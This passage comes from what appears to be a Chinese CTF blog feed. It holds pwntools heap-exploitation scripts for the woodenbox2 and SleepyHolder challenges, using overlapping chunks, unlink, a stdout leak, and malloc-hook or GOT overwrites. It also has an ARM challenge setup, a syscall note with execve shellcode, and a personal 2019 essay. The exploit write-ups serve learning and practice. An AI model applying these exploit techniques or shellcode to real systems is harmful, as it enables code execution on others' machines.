class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./woodenbox2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./woodenbox2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc6_2.23-0ubuntu11_amd64.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l,name)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"length of item name:"</span>,str(l))</span><br><span class="line">        p.sendlineafter(<span class="string">"name of item:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,l,name)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"index of item:"</span>,str(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">"length of item name:"</span>,str(l))</span><br><span class="line">        p.sendlineafter(<span class="string">"new name of the item:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"item:"</span>,str(idx))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#overlapping</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"0"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"1"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"2"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"3"</span>*<span class="number">0x68</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">"6"</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">"7"</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_IO_2_1_stdout_</span></span><br><span class="line">change(<span class="number">2</span>,<span class="number">0x32</span>,<span class="string">'5'</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"4"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = leak - (<span class="number">0x7ffff7a89b00</span> <span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.info(<span class="string">"libc_base:"</span>+hex(libc.address))</span><br><span class="line">__malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'__malloc_hook:'</span>+hex(__malloc_hook))</span><br><span class="line">realloc = libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">log.info(<span class="string">'realloc:'</span>+hex(realloc))</span><br><span class="line">one_gadget = libc.address+<span class="number">0x4526a</span></span><br><span class="line">log.info(<span class="string">'one_gadget:'</span>+hex(one))</span><br><span class="line"></span><br><span class="line"><span class="comment">#realloc_hook</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x38</span>,<span class="string">'5'</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+p64(__malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc))</span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于堆溢出漏洞（例如off-by-one），常见的打法是overlapping造成double free，然后将one_gadget写入realloc_hook中。如果没有show操作，就可以利用_IO_1_2_stdout来泄漏libc。</p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> gxzy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>&#39;fastbin_dup_consolidate与unlink天作之和&#39;</title>
      <link href="/2020/03/12/fastbin-dup-consolidate%E4%B8%8Eunlink%E5%A4%A9%E4%BD%9C%E4%B9%8B%E5%92%8C/"/>
      <url>/2020/03/12/fastbin-dup-consolidate%E4%B8%8Eunlink%E5%A4%A9%E4%BD%9C%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="unlink攻击条件"><a href="#unlink攻击条件" class="headerlink" title="unlink攻击条件"></a>unlink攻击条件</h3><p>两个非fastbin大小的chunk, 如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0xf251f0:0x00000000000000000x0000000000000021 &lt;-fake_chunk</span><br><span class="line">0xf25200:0x00000000006020b80x00000000006020c0</span><br><span class="line">0xf25210:0x00000000000000200x0000000000000fb0 &lt;-chunk1</span><br><span class="line">0xf25220:0x00000000000000610x0000000000000000</span><br><span class="line">pwndbg&gt; x/gx 0x6020d0</span><br><span class="line">0x6020d0:0x0000000000f251f0</span><br></pre></td></tr></table></figure><p>其中fake_chunk处于释放状态，即chunk1的RPEV_INUSE=0。</p><p>fake_chunk-&gt;FD-&gt;BK=&amp;fake_chunk，即*(0xf251f0+0x10)+0x18 = 0x6020d0</p><p>fake_chunk-&gt;BK-&gt;FD=&amp;fake_chunk，即*(0xf251f0+0x18)+0x10 = 0x6020d0</p><p>chunk-&gt;prev_size = fake_chunk-&gt;size</p><p>攻击结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x6020d0</span><br><span class="line">0x6020d0:0x00000000006020b8</span><br></pre></td></tr></table></figure><h3 id="fastbin-dup-consolidate攻击效果"><a href="#fastbin-dup-consolidate攻击效果" class="headerlink" title="fastbin_dup_consolidate攻击效果"></a>fastbin_dup_consolidate攻击效果</h3><p>double free之后一个在fastbin中，一个在smallbin中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x603be0 ◂— 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x30 [corrupted]</span><br><span class="line">FD: 0x603be0 ◂— 0x0</span><br><span class="line">BK: 0x603be0 —▸ 0x7ffff7dd1b98 (main_arena+120) ◂— 0x603be0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>这时候如果我们malloc(0x28)，该chunk虽然可以写入，但是属于一个被释放的smallbin，因此可以在构造该chunk为满足unlink的fake_chunk</p><h3 id="例题：hitcon2016-SleepyHolder"><a href="#例题：hitcon2016-SleepyHolder" class="headerlink" title="例题：hitcon2016-SleepyHolder"></a>例题：hitcon2016-SleepyHolder</h3><p>该程序功能如下：</p><p>1、keep secret(malloc)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">small serect：malloc(40)</span><br><span class="line">big secret: malloc(4000)</span><br><span class="line">huge secret: malloc(400000)</span><br></pre></td></tr></table></figure><p>2、wipe secret(free)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">small secret: 未清零，double free</span><br><span class="line">big seret: 未清零，double free</span><br></pre></td></tr></table></figure><p>3、renew secret(edit)</p><p>分析如下：</p><p>因为每个secret只能malloc一次，因此无法造成经典的fastbin_dup，但是可以造成fastbin_dup_consolidate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后修改chunk1构造fake_chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f_ptr = <span class="number">0x6020d0</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk += p64(f_ptr - <span class="number">0x18</span>) + p64(f_ptr<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk += <span class="string">'\x20'</span></span><br><span class="line">add(<span class="number">1</span>, fake_chunk)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#unlink</span></span><br></pre></td></tr></table></figure><p>接下来就可以任意读写了，将free@got改为 puts@plt，泄露出libc基址，然后将free@got改为 system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f = p64(<span class="number">0</span>) + p64(atoi_GOT) + p64(puts_GOT)</span><br><span class="line">f += p64(free_GOT) <span class="comment">#f_ptr = 0x6020d0</span></span><br><span class="line">f += p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">update(<span class="number">1</span>, f)</span><br><span class="line">update(<span class="number">1</span>, p64(puts_plt)) </span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">s = r.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = u64(s.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - atoi_offset</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">update(<span class="number">1</span>, p64(system))</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'\bin\sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019</title>
      <link href="/2020/01/07/2019/"/>
      <url>/2020/01/07/2019/</url>
      
        <content type="html"><![CDATA[<div class="note ">            <p>地铁没有坐正与坐反，只有起点和终点！</p>          </div><p>那是一个月黑风高的晚上，窗外刮着不太冷的寒风。我在庆祝新年的喧嚣声中小心翼翼的守护着那独一份的孤独，在百无聊赖之中，我在电脑上敲下了数行文字，用以记录上一年的某些事情，顺便聊以慰藉。就这样，我花了一个小时来记录我的2018，于此同时，我打算用一年的时光来书写我的2019。世事如影，诸君若闲，愿细数与听。</p><h4 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h4><p>人总向往诗和远方，却被生活种种束缚在了原地。阿磊跟我说：“十八岁计划出门远行，到现在还没有踏出一步。”我说：“不如今年寒假去西藏吧！”于是我们一拍即合，就这样踏上中国海拔最高的那片区域。我们先来到了武汉，顺便找了很久没见的阿峰吃了顿饭。阿峰是个很有意思的人，饭桌上我们都狂笑不止，谈论着往事与将来。</p><p>第二天我们坐动车来到了重庆。在阿磊同学的带领下，我们用半天时间品尝了磁器口的麻花，体验2号线的穿楼轻轨，吃了渝大师的中辣火锅，看到了灯光璀璨的洪崖洞。同行的还有多年未见的阿健，我跟阿健说：“雾锁山城山锁雾”，他回道：“山困雾都雾困山”。之后我们去了机场，在机场待了一宿第二天凌晨6点飞往拉萨。重庆是我待过的时间最短的城市，却给我一种玩了很久的感觉。我喜欢它那种古代与现代的完美结合，喜欢它好吃不贵的火锅以及入口即化的麻花。</p><p>第一次感受到西藏的与众不同之美便是在飞机上。我们快到西藏的时候正是朝阳出升的时候，然后最绚丽的不是飞在云端观看日出，而是彩虹机翼下那延绵不绝的雪山。我从未见过如此壮丽的大自然，或许是见识短浅，但那种感觉可以让人忘却一切烦恼。在飞机上认识了一位漂亮的藏族姑娘，她跟我讲述的许多当地的饮食于文华。下了飞机之后迎面扑来的是刺穿秋裤的寒气，也许此地别样的热情，连寒气都迫不及待的想与你来一场肌肤之亲。</p><p>冬天的西藏其实并没有那么寒冷，只是早晚温差比较大以及日出日落都很晚。我们在玛吉阿米喝了一壶甜茶，在大昭寺门前晒了会太阳，去布达拉宫买了条哈达，坐着大巴在最美的318国道上驰骋，去了湖水蓝如宝石的巴松，在藏民家里吃了牦牛粥喝了酥油茶，去了有“西藏江南”之称的林芝。一切犹如行云流水一般朴实无华且充满乐趣。</p><p>之后我们踏上了44小时的绿皮火车远下江南。</p><div class="note ">            <p>浊夜未央。清月渐凉。无睡意、偏倚寒窗。揭衣成被，落地为床。听欢声起，笑声伏，鼾声长。<br>    此生漫漫，皆在奔忙。几时能、闲下空想。乘风而去，踏雪回乡。携云一溪，酒一壶，琴一张。</p><pre><code>——《行香子·归途》</code></pre>          </div><h4 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h4><p>我们努力想让生活充实有趣且与众不同，但有些事却是生活中的一些地标，你可以绕弯，可以停留，但是必须经过那里。</p><p>这一年的春节最大的乐趣莫过于每晚的夜宵，我和老头小酌一杯之余将白天的剩菜一扫而光，其中我最爱的便是某一家的腊肠。</p><p>开学之后便忙着保研的诸多事宜，从资料收集，到关注消息，再到简历投递，每一环节看似自然却扣人心弦。</p><p>和学长们打了场国赛，第一天ak题目后我们点了披萨庆祝。</p><p>四月份的某天，我那蓄势已久的薰衣草突然在一场暴风之后接二连三的破土而出。一时间竟体会到小学作文中常写的：“我种下一颗种子，终于发出了芽。”</p><p>五一我回了趟家，跟家人一起去山里摘了树莓。上一次已是十多年前的事了。</p><p>六月份的某一天，我在宿舍看着猛龙打勇士。我知道那一天必将载入NBA史册。</p><p>考试结束后和阿九去了镇海角。</p><p>去了苏州参加国赛的半决赛。</p><p>七月份的某一天，我来到了上海参加上海交通大学的选拔。认识了阿馨，也见到了多年未见的阿彪。</p><p>在国赛失利之后，我开始学pwn，开始研究一些真实的漏洞，开始看一些书，开始有计划的刷题，开始用博客记录学习的过程，开始入门CTF。不巧的是，那时候《亲爱的热爱的》正在热播。</p><p>后面我去浙大之江实验室实习了一个月，参加了一次护网比赛。</p><p>暑假在家待了一个月，这大概是我十多年来，在家连续待得最久的一次。</p><p>开学去打了场工控安全竞赛，侥幸拿了二等奖。</p><h4 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h4><p>有些事情当时会让你觉得一夜成长，过后又云淡风轻。</p><p>9月15日</p><p>我预约了某照相馆的证件照之后，便一大早去了那里。由于来的太早，我在旁边的咖啡店点了一杯咖啡。我想让自己静下来，但是心却始终高悬不下。前一天晚上几个跟我一起报浙大的同学九推初审都过了，我却还没有结果。我跟阿峰说：“有没有什么能让我心情好一点，我现在很糟。“阿峰一开始不相信我这种人也会心情很糟，后来他推荐我去看脱口秀大会呼兰的段子。呼兰的段子是不错，可是这并不能让我轻松起来。我于是怀着这种心情拍完了证件照，我看了看证件照，白粉棕眉下隐藏的那种淡淡的忧伤还有点小帅，应该仅次于杜小帅了。没过多久，我便收到通过初审的短信。我又去看了两眼证件照，淡淡的忧伤下潜藏的未知的喜悦让小帅之余带点优雅，那时候我想，可以刚一刚杜小帅了。</p><p>9月23日</p><p>我和阿翼去了紫荆港参加机试。那时的阿翼，手握清华、人大、北航的offer，而我，空有清风，天气太热，连两袖都没有。就这样，它带着100分的机试成绩早早地出了考场，我带着63分的忧伤守候着结束的铃声。我一边埋怨自己为什么不多刷两道pat，一边吐槽着我一个CTF选手为啥要来参加机考，一边又赶紧找老师学长捞一波。一边绝望，一边又抱有希望。一边愤恨，一边又有点窃喜。我不知当时的我是怎样的的心情，只知道那天在酒店点的烧烤还挺香的。</p><p>9月24日</p><p>我和同行的几个小伙伴去参加面试。面试来了挺多人，大概就是传说中的各路牛鬼蛇神吧。按照我以往的尿性，面试十有八九都是“我跟你不熟，并不想听你叽里呱啦问七问八。”其实主要是，他们老问我一些不会的，让场面一度尴尬，让氛围瞬间如死水一般。果不其然，面试炸了。我只好寄希望于一方有难八方支援。从那一刻起，我的希望逐渐破灭，信心逐渐丧失，只剩下心悬一线。晚上坐在老师的车上，老师跟我说如果失败了你可以参加统考或者出国，我这边都可以帮你，我越听越绝望，不禁陷入了沉思，心随黑夜一般，不知几何，也不知代数。</p><p>9月25日</p><p>我早早地就醒了。我看了看墙上的电线，又去阳台站了许久。我从未体会那种内心的五味杂陈，这个词语我一般只在小说电影才看到，使用的时候也是那种为赋新词强说愁。我后来又回到了沙发上，在手机的便签上写下：</p><div class="note ">            <p>终于体会到了什么叫孤注一掷的煎熬，早上醒来，思绪就被打乱，无法再安心入眠。看到窗外的朝阳，觉得很美丽，但是不敢多看两眼。</p>          </div><p>9月26日</p><p>这天公布九推结果。我的结果是未录取。那是已是九推尾声，我手上还没有一个offer，意思就是我应该没有学校读了。从一开的壮志满怀到一落千丈只需要仅仅几天，这突然的一切让我猝不及防。我开始茶饭不思，神情恍惚，整个人如同行尸走肉。阿九见证了这一切。我只好将全部希望压在实验室导师身上，导师说，只要有人放弃就争取优先录取我。我打了个电话给辅导员，向他说明的情况，他让我盯紧一点。那一刻，我有燃起了一丝希望。阿九也许不知道这些。</p><p>9月27日</p><p>我回到了学校，回到了宿舍。我掩饰着内心的不安，与室友谈论着日常。阿仔告诉我可以提前联系一下前面录取的人，看有没有愿意放弃的。我试着做了，那一刻，我完全底下了高傲的头颅，询问他们是否愿意放弃名额。果然这招屡试不爽，一下子就联系到了五六个。我将这个消息告诉实验室的导师，导师也同样欣喜。导师告诉我说，会让学姐在招生办盯着，有人放弃就想办法捞我，我的希望之火又燃起了一些。到了晚上，大家都忙着填志愿。我知道那与我无关，但我依然选择一宿未眠，小心翼翼的守护着我那脆弱而又不堪一击的脆弱之火。</p><p>9月28号</p><p>早上7点，第一批录取已经结束。然后开始补录，直到下午5点。补录结束，而我的电话一整天都悄然无声。我当时在宿舍阳台上，看着学姐发给我：“补录结束了，我已经尽力了。“那几个字瞬间化作冰冷雨滴，将我的希望之火浇的一丝不剩。我突然内心一阵绞痛，蹲在了地上。当我再站起来的时候，我发现阳台的薰衣草已经枯萎。我跟阿润说我要找工作了，阿润说你即使去工作也不虚的。然后我开始告诉并且说服老头子我要去找工作。老头子并没说太多也没有反对。于是我去找了阿龙，阿龙说你就不要来和我们抢饭碗了，之后我们去喝了点小酒。在路上阿慈打电话来找我聊天，我告诉了他我的决定。喝酒的时候，导师打电话来说问我要不要直博，说有五成机会，我敷衍地答应了。</p><p>9月29号</p><p>早上醒来，老头子给我发了一大段作为父亲的不忍与承诺，我不知道如何回复。我和室友出门了，这天太阳格外耀眼。出门之前，我把蓄了很久的胡子刮了，突然感到一阵释怀。我不知道是释怀还是躲避，我内心还在想着直博的事。九点左右，上交招生办打来电话，说我前面还有一个同学如果放弃的话就补录到我了，我于是按照她的意思填了志愿。没过一会儿，复试通知下来了。我低头看了看短信，又抬头看了看天空，阳光洒在我的脸上，仿佛自由的雨滴。“有些鸟儿是终究关不住的，它们的羽毛太鲜艳了”。那是内心的自由，我仿佛压抑了很久很久。后来浙大的录取通知来了，我最终去了浙大。</p><p>也许正如某位老先生说的：</p><div class="note ">            <p>天将那啥，必先那啥！</p>          </div><h4 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h4><p>有些事是生活的地标，你在达到它之前或许会朴实无华且枯燥地走着两点之间线段最短，或许会波澜壮阔精彩纷呈地静赏陌上花开，或许会绕了一大弯还摔了一两跤。但是不管怎样，到了之后，你还会继续往前走。</p><p>后面的的时间我大部分待在了实验室，还记得那时满城桂花飘香。</p><p>第一个周末去了骑马射箭，写了一篇《杭秋》。我最喜欢其中一句：</p><div class="note ">            <p>彤叶惹黄花，因羞泛红；清水戏明月，为情相映。</p>          </div><p>细细品之，至今留有余味。</p><p>11月回了趟学校，第一次在火车丢了电脑。而后参加省赛。</p><p>12月21,22日，陪阿九考研。</p><p>12月26~29日，代表浙大AAA参加xnuca总决赛，苟到了最后一个三等奖。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们往往都记得那些突然发生的事情，却往往忽略那些一直在坚持的事业。赛博如海，我是沧海一粟。然而：</p><div class="note ">            <p>我最进看了很多教程，也研究了很多的漏洞，感触颇深，现在看来，我亦是有成为世间黑客的潜质！</p>          </div><p><img style="zoom: 50%;" data-src="/2020/01/07/2019/1.jpg" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2019xnuca总决赛adw7 writeup</title>
      <link href="/2019/12/30/2019xnuca%E6%80%BB%E5%86%B3%E8%B5%9Badw7-writeup/"/>
      <url>/2019/12/30/2019xnuca%E6%80%BB%E5%86%B3%E8%B5%9Badw7-writeup/</url>
      
        <content type="html"><![CDATA[<div class="note ">            <p>Thank you, thank you all so very much, thank you to all of you in this room, none of there would be possible without you. Thank you!</p>          </div><h3 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h3><p>这是一道arm菜单题</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h4><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y gcc-arm-linux-gnueabi</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm  -L /usr/arm-linux-gnueabi ./awd7</span><br></pre></td></tr></table></figure><h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>安装gdb-multiarch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure><p>socat启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10005,fork exec:&quot;qemu-arm  -L /usr/arm-linux-gnueabi ./awd7&quot;,reuseaddr</span><br></pre></td></tr></table></figure><p>python脚本启动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"10005"</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>gdb调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q awd7</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>ida打开，发现很明显的缓冲区溢出以及get shell的后门。</p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
            <tag> pwn </tag>
            
            <tag> xnuca </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux 系统调用相关</title>
      <link href="/2019/12/25/linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3/"/>
      <url>/2019/12/25/linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<div class="note ">            <p>If you look for it, I’ve got a sneaky feeling you’ll find that love actually is all around.</p>          </div><h3 id="标准输入输出"><a href="#标准输入输出" class="headerlink" title="标准输入输出"></a>标准输入输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标准输入 即STDIN , 在 /dev/stdin , 一般指键盘输入, shell里代号是 0</span><br><span class="line">标准输出 即STDOUT, 在 /dev/stdout, 一般指终端(terminal), 就是显示器, shell里代号是 1</span><br><span class="line">标准错误 即STDERR, 在 /dev/stderr, 也是指终端(terminal), 不同的是,  shell里代号是 2</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/12/25/linux-系统调用相关/1.PNG" class="lazyload"></p><h3 id="32位系统调用"><a href="#32位系统调用" class="headerlink" title="32位系统调用"></a>32位系统调用</h3><p><a href="http://www.lxhp.in-berlin.de/lhpsysc1.html" target="_blank" rel="noopener">32位系统调用</a></p><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">系统调用号：4</span><br><span class="line">函数路径：glibc-2.27/io/write.c</span><br><span class="line">函数定义：ssize_t write(int fd, const void *buf, size_t nbyte);</span><br><span class="line">fd：文件描述符；</span><br><span class="line">buf：指定的缓冲区，即指针，指向一段内存单元；</span><br><span class="line">nbyte：要写入文件指定的字节数；</span><br><span class="line">返回值：写入文档的字节数（成功）；-1（出错）</span><br></pre></td></tr></table></figure><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><h3 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在32位汇编下相当于:</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode:&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">disasm如下：</span><br><span class="line">   0:   31 c9                   xor    ecx,ecx</span><br><span class="line">   2:   f7 e1                   mul    